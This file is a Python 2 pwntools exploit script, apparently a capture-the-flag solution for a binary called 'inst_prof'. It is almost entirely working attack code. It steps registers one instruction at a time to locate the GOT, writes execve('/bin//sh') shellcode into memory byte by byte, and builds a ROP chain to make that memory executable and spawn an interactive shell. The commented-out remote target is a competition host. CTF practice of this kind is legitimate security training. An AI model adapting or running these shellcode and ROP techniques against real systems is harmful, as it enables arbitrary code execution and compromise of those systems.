#!/usr/bin/env python2

from pwn import *
from IPython import embed

context(arch='amd64', os='linux')
# context.log_level = 'debug'

def writeByteString(str):
    mov_r15 = "\x41\xc6\x07"
    inc_r15 = asm('inc r15') + ret          # "\x49\xff\xc7" + ret

    for byte in str:
        p.send(mov_r15 + byte)              # mov byte ptr [r15], {byte}
        p.send(inc_r15)

p = process("./inst_prof")
# p = remote("inst-prof.ctfcompetition.com", 1337)

print(p.readline())

shellcode = (
    "\xb0\x3b\x99\x48\xbb\x2f"
    "\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x52\x53\x54\x5f\x52"
    "\x57\x54\x5e\x0f\x05"
)

ret = asm('ret')                                # "\xc3"

# We store the content rsp is pointing to in r13.
p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24" 4 bytes! so we can not append a ret instrucction. 
# This is going to be executed 0x1000 times which is not going to suppose a problem.

# We need to get 0x2014e8 and add it to r13
p.send(asm('add r15, 0x20'))                # "\x49\x83\xc7\x20" -> r15 = 0x20 * 0x1000 -> 0x20000
# Again, remember that the instruction will be executed 0x1000 times if we do not add a "ret" opcode.
# This way we are going to store 0x20 * 0x1000 (0x20000) in r15.

# We send 0x10 times the next instruction.
# Each of this sends will not be executed 0x1000 times because we are adding a `ret` opcode.
inst = asm('add r14, r15') + ret
for i in range(0x10):
    p.send(inst)       # "\x4d\x01\xfe" + "\x3c"; r14 = 0x200000
# It has a ret instrucction attached so it will only going to get executed once each sending.
# r14 has a initial value of 0x0 so adding to 0x0 0x10 times 0x20000 will result in 0x200000!

# r10 is initially 0x487. If we add it 0x9D times to r14 we get ...
inst = asm('add r14, r10') + ret            # "\x4d\x01\xd6" + "\x3c"
for i in range(0x9D):
    p.send(inst)                            # r14 = 0x2014da ! We are pretty close

# We only need an extra 0xE so ...
inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"
for i in range(0xE):
    p.send(inst)                            # r14 = 0x2014e8 !!

# Ta-dahhh! Now we add r13 (which have [rsp])  and ... 
p.send(asm('add r13, r14') + ret)           # "\x4d\x01\xf5" + "\xc3"; 
# r13 = r13 + 0x2014e8 = GOT TABLE !! 

# We make a copy of the initial address of the GOT in r14
p.send(asm('mov r14, r13') + ret)           # "\x4d\x89\xee" + "\xc3";

# We add 0x80 to r14 to point aheader, not the values we do not want to overwrite.
inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"; 
for i in range(0x80):
    p.send(inst)

# Copy of the address + 0x80 to r15.
# We will need this copy to use it as an iterator to copy each byte of the shellcode into memory.
p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7" + "\xc3";

writeByteString(shellcode)
# r13 -> Addr GOT Table
# r14 -> Addr Shellcode
# r15 -> Addr End Shellcode

# 3) rsp + 24 -> ROP pop rdi + ret
# 1) rsp + 32 -> GOT table address (r13)
# 2) rsp + 40 -> addr make executable
# rsp + 48 -> shellcode addr

# 1) rsp + 32 -> GOT table address (r13)
p.send(asm('mov r15, rsp') + ret)        # "\x49\x89\xe7"

inst = asm('inc r15') + ret                     # "\x49\xff\xc7"
for i in range(32):
    p.send(inst)
p.send(asm('mov [r15], r13') + ret)     # \x4d\x89\x2f
# :> pxq 8 @ rsp+32
# 0x7ffde1355c48  0x000055664a259000                       ..%JfU..

# 2) rsp + 40 -> addr make executable
p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24"
inst = asm('dec r13') + ret
for i in range(248):
    p.send(inst)                            # "\x49\xff\xcd"
p.send(asm('mov r15, rsp') + ret)           # "\x49\x89\xe7"
inst = asm('inc r15') + ret
for i in range(40):
    p.send(inst)                            # "\x49\xff\xc7"
p.send(asm('mov [r15], r13') + ret)         # "\x4d\x89\x2f"
# :> pxq 8 @ rsp+24
# 0x7ffde1355c40  0x000055664a057a20                        z.JfU..

# 3) rsp + 24 -> ROP pop rdi + ret
p.send(asm('mov r13, [rsp]'))              # "\x4c\x8b\x2c\x24"
inst = asm('inc r13') + ret
for i in range(0xab):
    p.send(inst)                                     # "\x49\xff\xc5" + ret
p.send(asm('mov r15, rsp') + ret)       # "\x49\x89\xe7" + ret
inst = asm('inc r15') + ret
for i in range(24):
    p.send(inst)                                     # "\x49\xff\xc7" + ret
p.send(asm('mov [r15], r13') + ret)     # "\x4d\x89\x2f" + ret
# :> pxq 8 @ rsp+24
# 0x7ffe34edf120  0x0000562f517c0bc3                       ..|Q/V..

p.send(asm('mov r15, rsp') + ret)        # "\x49\x89\xe7" + ret
inst = asm('inc r15') + ret
for i in range(24):
    p.send(inst)                                      # "\x49\xff\xc7" + ret

p.send(asm('mov rsp, r15') + ret)        # "\x4c\x89\xfc" + ret
p.send(asm('mov [rsp], r14'))              # "\x4c\x89\x34\x24"
p.interactive()
